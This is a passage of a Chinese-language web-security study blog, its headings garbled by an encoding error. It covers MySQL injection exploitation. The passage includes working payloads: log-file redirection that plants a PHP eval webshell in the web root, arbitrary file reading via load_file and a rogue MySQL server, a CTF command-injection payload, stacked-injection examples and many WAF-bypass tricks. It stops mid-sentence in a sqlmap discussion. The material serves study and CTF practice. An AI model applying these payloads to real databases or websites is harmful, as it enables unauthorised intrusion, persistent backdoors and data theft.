id="å†™å…¥æ—¥å¿—æ–‡ä»¶"><a href="#å†™å…¥æ—¥å¿—æ–‡ä»¶" class="headerlink" title="å†™å…¥æ—¥å¿—æ–‡ä»¶"></a>å†™å…¥æ—¥å¿—æ–‡ä»¶</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --æŸ¥çœ‹é…ç½®ï¼Œæ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œå’Œmysqlé»˜è®¤logåœ°å€(è®°ä¸‹åŸåœ°å€æ–¹ä¾¿æ¢å¤)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # è¿™é‡Œæ—¥å¿—åˆ›å»ºæƒé™è¦ä½ä¸€äº›ï¼Œä¸èƒ½åœ¨cç›˜åˆ›å»º</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--ç»“æŸåï¼Œç—•è¿¹æ¸…ç†</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ…¢æŸ¥è¯¢</p><p>Fromï¼š<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨æ…¢æŸ¥è¯¢å†™å‘¢ï¼Ÿå› ä¸ºå¼€å¯æ—¥å¿—ç›‘æµ‹åæ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œç½‘ç«™è®¿é—®é‡å¤§çš„è¯æˆ‘ä»¬å†™çš„shellä¼šå‡ºé”™</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--æŸ¥çœ‹æ…¢æŸ¥è¯¢ä¿¡æ¯</span><br><span class="line">set global slow_query_log=1;--å¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—(é»˜è®¤ç¦ç”¨)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--æŸ¥çœ‹é»˜è®¤æ—¶é—´å€¼ï¼Œå½“sqlè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡è¯¥å€¼æ‰ä¼šè¢«è®¡å…¥æ—¥å¿—ä¸­ï¼Œé»˜è®¤10ç§’</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--å†™shellåˆ°æ…¢æŸ¥è¯¢æ—¥å¿—</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-â€“os-shell"><a href="#sqlmap-â€“os-shell" class="headerlink" title="sqlmap  â€“os-shell"></a>sqlmap  â€“os-shell</h5><ul><li><p>å¤§è‡´æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·å–ç›®æ ‡ä¿¡æ¯â†’ä½¿ç”¨lines terminated byå°†å…·æœ‰æ–‡ä»¶ä¸Šä¼ çš„ğŸä¸Šä¼ åˆ°ç½‘ç«™â†’é€çº§ç›®å½•è®¿é—®æ‰¾åˆ°ğŸ</span><br><span class="line"></span><br><span class="line">â†’é€šè¿‡è¯¥ğŸä¸Šä¼ çœŸæ­£çš„å‘½ä»¤ğŸâ†’æµ‹è¯•å‘½ä»¤ğŸèƒ½å¦æ‰§è¡Œâ†’åˆ é™¤ä¸Šä¼ çš„ä¸¤ä¸ªğŸ</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ ğŸï¼šformè¡¨å•</p></li><li><p>phpå‘½ä»¤é©¬ï¼šè·å¾—<code>disable_function</code>ï¼Œéå†æ‰€æœ‰ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œåˆ¤æ–­å“ªä¸€ä¸ªä¸åœ¨<code>disable_function</code>ã€‚</p></li></ul><h4 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h4><h5 id="LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–"><a href="#LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–" class="headerlink" title="LOAD DATA LOCALâ€”ä»»æ„è¯»å–"></a><code>LOAD DATA LOCAL</code>â€”ä»»æ„è¯»å–</h5><h6 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="åŸç†å’Œæ”»å‡»æ€è·¯"><a href="#åŸç†å’Œæ”»å‡»æ€è·¯" class="headerlink" title="åŸç†å’Œæ”»å‡»æ€è·¯"></a>åŸç†å’Œæ”»å‡»æ€è·¯</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></p><blockquote><p>æ–‡ä»¶è¯»å–<code>Phar</code>æ–‡ä»¶ï¼Œé€ æˆphpååºåˆ—åŒ–</p></blockquote><h6 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--local-infile=OFF å¯ä»¥ä¿®å¤ï¼Œæˆ–è€…æ›´æ”¹å…¨å±€å˜é‡local_infile(æˆ‘åœ¨5.7ä¸‹å‚æ•°å¯ä»¥ï¼Œæ›´æ”¹å…¨å±€å˜é‡ä¸è¡Œï¼Ÿï¼Ÿ)</span><br></pre></td></tr></table></figure></li><li><p>å®¢æˆ·ç«¯æ”¯æŒéSSLè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--ssl-mode=VERIFY_IDENTITY å¯ä»¥ä¿®å¤</span><br></pre></td></tr></table></figure></li><li><p>ç›®æ ‡webå­˜åœ¨è¿æ¥æ•°æ®åº“çš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“å¼±å£ä»¤æ‰«æï¼Œè¿æ¥æ£€æŸ¥</span><br><span class="line">ç½‘ç«™é‡è£…æ¼æ´ï¼ˆéœ€è¦è¿æ¥æ•°æ®åº“ï¼‰</span><br><span class="line">æ•°æ®è¿ç§»æœåŠ¡</span><br><span class="line">Excleä»æ•°æ®åº“ä¸­åŒæ­¥æ•°æ®åˆ°è¡¨æ ¼å†…</span><br></pre></td></tr></table></figure></li></ul><h6 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„mysqléƒ½æ˜¯5.7ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>é»˜è®¤å¼€å¯</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>æ³¨ï¼šä¸€å¼€å§‹ä½¿ç”¨æœåŠ¡ç«¯ä½¿ç”¨8ç‰ˆæœ¬ä¸è¡Œ</p><p>æ”»å‡»è€…ï¼ˆæœåŠ¡ç«¯ï¼‰èµ·è„šæœ¬</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>å—å®³è€…è¿æ¥</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>æ”»å‡»è€…æŸ¥çœ‹<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>æ³¨æ„ï¼šè½¬ä¹‰å­—ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t é”™è¯¯è·¯å¾„</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# æ­£ç¡®</span><br><span class="line">select load_file(0x653A5C746573742E747874);# æ”¯æŒåå…­è¿›åˆ¶</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# æ”¯æŒcharå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>ä¸‹æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # å¯¼å‡ºdb1ä¸­çš„a1ã€a2è¡¨</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡æœ¬å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“åˆ¤æ–­è¯­å¥-åˆ é™¤è¡¨-åˆ›å»ºè¡¨-é”è¡¨-ç¦ç”¨ç´¢å¼•-æ’å…¥æ•°æ®-å¯ç”¨ç´¢å¼•-è§£é”è¡¨</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="ä¾‹é¢˜-3"><a href="#ä¾‹é¢˜-3" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>CISCN2023åˆèµ›â€“dumpit</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#é»‘åå•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>dbå’Œtableéƒ½å¯æ§ï¼Œè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œé€ æˆRCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>å›½å…‰å¸ˆå‚…âœçš„å¤ªå¥½è¾£ï¼Œç­‰åˆ°åé¢å­¦ä¹ windowsææƒå†å¤ç°å§ğŸ˜‹</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"><a href="#Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨" class="headerlink" title="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"></a>Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨</h4><p><code>help</code>æŸ¥çœ‹<code>mysql</code>å¸®åŠ©</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>å‡æƒ³ï¼šå¦‚æœå­˜åœ¨å †å æ³¨å…¥ï¼Œå°±å¯ä»¥ä»¥å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>æµ‹è¯•äº†ä¸€ä¸‹å¥½åƒä¸è¡Œ</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>å¹¶ä¸”æ­¤æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°è¯»å–ï¼Œè¿œç¨‹è¿æ¥mysqlæ—¶ä½¿ç”¨systemï¼Œå®é™…ä¸Šè¿˜æ˜¯åœ¨åŸæ¥çš„ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</strong></p><p><code>kali</code>è¿æ¥è¿œç¨‹mysqlï¼Œ<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysqlç»•è¿‡è¡¥å……"><a href="#Mysqlç»•è¿‡è¡¥å……" class="headerlink" title="Mysqlç»•è¿‡è¡¥å……"></a>Mysqlç»•è¿‡è¡¥å……</h2><h3 id="é€šç”¨ç»•è¿‡"><a href="#é€šç”¨ç»•è¿‡" class="headerlink" title="é€šç”¨ç»•è¿‡"></a>é€šç”¨ç»•è¿‡</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p><p>ä¿®å¤ï¼šæ­£åˆ™<code>/i</code></p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆwafå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œä¸”æ¬¡æ•°ä¸º1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šæ­£åˆ™<code>/m</code></p></li></ul><h3 id="æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="æ³¨é‡Šç¬¦ç»•è¿‡"></a>æ³¨é‡Šç¬¦ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰‹åŠ¨é—­åˆ</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>æ‹¬å·ç»•è¿‡</p><blockquote><p>åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h3><h4 id="ä¸è®©ç”¨å•å¼•å·"><a href="#ä¸è®©ç”¨å•å¼•å·" class="headerlink" title="ä¸è®©ç”¨å•å¼•å·"></a>ä¸è®©ç”¨å•å¼•å·</h4><p>å¯ä»¥ç”¨åå…­è¿›åˆ¶ä»£æ›¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) â†’ where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="è½¬ä¹‰äº†å•å¼•å·"><a href="#è½¬ä¹‰äº†å•å¼•å·" class="headerlink" title="è½¬ä¹‰äº†å•å¼•å·"></a>è½¬ä¹‰äº†å•å¼•å·</h4><p>å®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥</p><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="selectç»•è¿‡"><a href="#selectç»•è¿‡" class="headerlink" title="selectç»•è¿‡"></a>selectç»•è¿‡</h3><ul><li><p>å·²çŸ¥è¡¨åå¯ä»¥ç”¨<code>handle</code></p></li><li><p>ç‰ˆæœ¬&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§</a></p></li><li><p>åœ¨å¯¹å½“å‰è¡¨çš„åˆ—åæ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™å­—æ®µåï¼Œè€Œæ— éœ€<code>select è¯¥å­—æ®µ from è¯¥è¡¨</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="é€—å·ç»•è¿‡"><a href="#é€—å·ç»•è¿‡" class="headerlink" title="é€—å·ç»•è¿‡"></a>é€—å·ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) ç­‰ä»·äº substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; ç­‰ä»·äº select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåŠ äº†!å°±ä¼šæ‰§è¡Œåœ¨/* */å†…çš„è¯­å¥</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># è¦å°†æ•´ä¸ªè¯­å¥å†™å…¥/* */å†…</span><br><span class="line">/*!union select */1,2 è¿™æ˜¯é”™è¯¯çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; å¯ä»¥</span><br><span class="line">/*!50726 select 1,2*/;  å¯ä»¥</span><br><span class="line">/*!50727 select 1,2*/;  ä¸å¯ä»¥</span><br><span class="line"></span><br><span class="line">00000 åˆ° 50726ä¹‹é—´æ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4><p><code>information_schem</code>è¢«è¿‡æ»¤ï¼Œä¸çŸ¥é“è¡¨çš„å­—æ®µå</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>é€šè¿‡<code>select æ•°å­—</code>å°†å­—æ®µåè®¾ç½®ä¸ºæ•°å­—</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>å†ç”¨è”åˆæŸ¥è¯¢å°†éœ€è¦çš„æ•°æ®å­˜åˆ°ä¸Šå›¾çš„è¡¨ä¸­</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>é‚£ä¹ˆæƒ³è¦æŸ¥è¯¢<code>users</code>è¡¨ä¸­çš„<code>username</code>å­—æ®µçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)åˆ«å;</span><br><span class="line"></span><br><span class="line"># åˆ«åæ˜¯(select 1,2 union select * from user)è¿”å›çš„è¡¨çš„åˆ«å</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåå¼•å·è¢«è¿‡æ»¤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="é¢„ç¼–è¯‘é—®é¢˜"><a href="#é¢„ç¼–è¯‘é—®é¢˜" class="headerlink" title="é¢„ç¼–è¯‘é—®é¢˜"></a>é¢„ç¼–è¯‘é—®é¢˜</h2><p>æ¨èé˜…è¯»ï¼š</p><p><a href="https://forum.butian.net/share/1559">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</a></p><p><a href="https://xz.aliyun.com/t/3950">PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶ - å…ˆçŸ¥ç¤¾åŒº</a></p><h3 id="é¢„ç¼–è¯‘å¤±æ•ˆ"><a href="#é¢„ç¼–è¯‘å¤±æ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘å¤±æ•ˆ"></a>é¢„ç¼–è¯‘å¤±æ•ˆ</h3><p><code>PHP-PDO</code>é‡‡ç”¨æœ¬åœ°é¢„å¤„ç†</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>ä¼ å…¥<code>?username=&#39;admin&#39;</code>,æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹</p><blockquote><p>å¼€å¯æ°¸ä¹…æ—¥å¿—,åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; æ—¥å¿—è·¯å¾„</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>å¯ä»¥çœ‹åˆ°é¢„ç¼–è¯‘ä¸ºå…¶è‡ªåŠ¨æ·»åŠ äº†ä¸€å¯¹å¼•å·ï¼Œå¹¶å°†ç”¨æˆ·è¾“å…¥çš„å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p><p>é‚£ä¹ˆå¦‚æœå°†è¡¨åï¼Œ<code>order by xx</code>å¤„è¿›è¡Œé¢„ç¼–è¯‘å°±ä¼šäº§ç”Ÿå¦‚ä¸‹æ•ˆæœ</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>å¯ä»¥çœ‹åˆ°è¿™äº›è¯­å¥â€å¤±æ•ˆäº†â€ï¼ˆæ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹äºè¿™äº›è¯­å¥å¤§æ¦‚ç‡å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥å¤„ç†ï¼Œå°±å¾ˆå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><h3 id="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"></a>é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQLæ³¨å…¥æ¼æ´ &amp;&amp; PDOçœŸ&#x2F;ä¼ªé¢„å¤„ç†åˆ†æ | ç¦»åˆ«æ­Œ</a></p></li><li><p>å †å æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># é¢„å¤„ç†è¯­å¥</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘ï¼Œå¹¶ä¸”æ²¡æœ‰ç»‘å®šå‚æ•°</p><p>åˆå› ä¸ºPDOé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œï¼Œæ‰€æœ‰é€ æˆäº†å †å æ³¨å…¥ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap æºç åˆ†æ</p><p><img src="/../images/routine.png" alt="img"></p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap é¡¹ç›®å‰–æ1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap é¡¹ç›®å‰–æ2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap é¡¹ç›®å‰–æ3</a></p><p>sqlmap ä½¿ç”¨ä¸€ç§æå…¶å·§å¦™çš„æ–¹å¼ç»„åˆç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ payloadï¼Œä¸€ä¸ªå®Œæ•´çš„ payload ç”±å¦‚ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ prefixã€commentã€suffix ä½œä¸º boundaryï¼Œboundary ç”¨äºé—­åˆæ³¨å…¥ç‚¹çš„å‰åéƒ¨åˆ†ï¼›test åˆ™æ˜¯æœ€ç»ˆå¦‚æœé—­åˆæˆåŠŸåå¿…ç„¶æ‰§è¡Œçš„è¯­å¥ã€‚</p><p>å› æ­¤ sqlmap å°† prefix ä¸ suffix å•ç‹¬ä½œä¸º boundaries ä¿å­˜ï¼Œè€Œ test å’Œ comment åˆ™æ ¹æ®æ³¨å…¥æ–¹å¼å’Œæ•°æ®åº“çš„ä¸åŒè¢«åˆ’åˆ†ä¸ºå…­ä¸ªæ–‡ä»¶ï¼ˆè·¯å¾„ï¼š<code>/data/xml/payloads</code>ï¼‰</p><p><img src="/../images/t01d7dbc46705981404.jpg" alt="img"></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap é¡¹ç›®å‰–æ4</a></p><p>å¸ƒå°”æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆå‘é€ä¸€ä¸ª false 